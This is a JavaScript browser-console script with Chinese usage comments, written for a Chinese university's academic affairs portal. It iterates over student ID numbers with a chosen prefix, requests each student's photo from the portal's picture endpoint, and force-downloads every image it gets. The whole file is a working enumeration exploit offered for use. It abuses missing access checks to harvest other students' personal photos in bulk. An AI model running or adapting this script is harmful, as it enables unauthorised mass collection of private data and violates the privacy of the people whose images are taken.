//author：宋胜利 
//usage：在南航教务处个人信息界面，右击图片，点检查打开控制台，复制以下代码，并设置学号前四位(如：window.s0="1616")，并运行 oo(); 即可下载学号前四位为设置值的所有学生图片到浏览器设置的默认下载文件夹
window.canv=document.createElement("canvas");
window.canv.setAttribute("width","150px");
window.canv.setAttribute("height","210px");
document.body.appendChild(window.canv);
window.ctx=window.canv.getContext('2d');
window.ctx.drawImage(document.getElementById("ZxzpObject"),0,0,150,210);
window.s0="1616";	//设置学号前四位
window.s1=0;
window.s2="04";
window.s3="01";
window.num=0;
window.f1=0;
window.ffalse=0;
function getimg(){
	try{
		window.s=window.s0+""+window.s1+window.s2+window.s3;
		console.log(window.s);
		document.getElementById("ZxzpObject").src="/netean/GetPic.asp?pic=xh&xh="+window.s;
		document.getElementById("ZxzpObject").onload=function(){
			window.ctx.drawImage(document.getElementById("ZxzpObject"),0,0,150,210);
			saveAs(dataURLtoBlob(window.canv.toDataURL("image/png",1)),window.s+".png");
			window.num++;
			window.ffalse=0;
			window.f1=0;
			window.s3=(parseInt(window.s3)+1)<10?"0"+(parseInt(window.s3)+1):(parseInt(window.s3)+1);
			getimg();
		}
		
	}catch(e){
		if(window.ffalse==0)
		{
			window.s2=(parseInt(window.s2)+1)<10?"0"+(parseInt(window.s2)+1):(parseInt(window.s2)+1);
		}
		if(window.ffalse==1)
		{
			window.s1++;
		}
		window.ffalse++;
		return;
	}
		
}
function cs(){
	window.s3="01";
	window.s2=(parseInt(window.s2)+1)<10?"0"+(parseInt(window.s2)+1):(parseInt(window.s2)+1);
}
function cs1(){
	window.s3="01";
	window.s2="01";
	window.s1++;
}

function n1(){
	cs();
	getimg();
}
function n2(){
	cs1();
	getimg();
}
function n3(){
	window.s3=(parseInt(window.s3)+1)<10?"0"+(parseInt(window.s3)+1):(parseInt(window.s3)+1);
	getimg();
}
function oo(){
	window.s1=0;
	window.s2="01";
	window.s3="01";
	getimg();
}
var script=document.createElement("script");
script.src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js";
document.body.appendChild(script);
//base64 转化称blob对象
function dataURLtoBlob(dataurl) {
        var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
        while (n--) {
            u8arr[n] = bstr.charCodeAt(n);
        }
        return new Blob([u8arr], { type: mime });
    }
//将blob对象保存
function saveAs(blob, filename) {
    var type = blob.type;
    var force_saveable_type = 'application/octet-stream';
    if (type && type != force_saveable_type) { // 强制下载，而非在浏览器中打开
        var slice = blob.slice || blob.webkitSlice || blob.mozSlice;
        blob = slice.call(blob, 0, blob.size, force_saveable_type);
    }
    var url = URL.createObjectURL(blob);
    var save_link = document.createElementNS('http://www.w3.org/1999/xhtml', 'a');
    save_link.href = url;
    save_link.download = filename;
    var event = document.createEvent('MouseEvents');
    event.initMouseEvent('click', true, false, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
    save_link.dispatchEvent(event);
    URL.revokeObjectURL(url);
}
document.getElementById("ZxzpObject").onerror=function(){
			window.f1++;
			if(window.f1==1 || window.f1==2 || window.f1==4 || window.f1==5 || window.f1==7 || window.f1==9){
				n3();
			}
			else if(window.f1==3 || window.f1==6){
				n1();
			}else if(window.f1==8 || window.f1==10){
				n2();
			}else if(window.f1>10){
				window.f1=0;
				return;
			}
		}
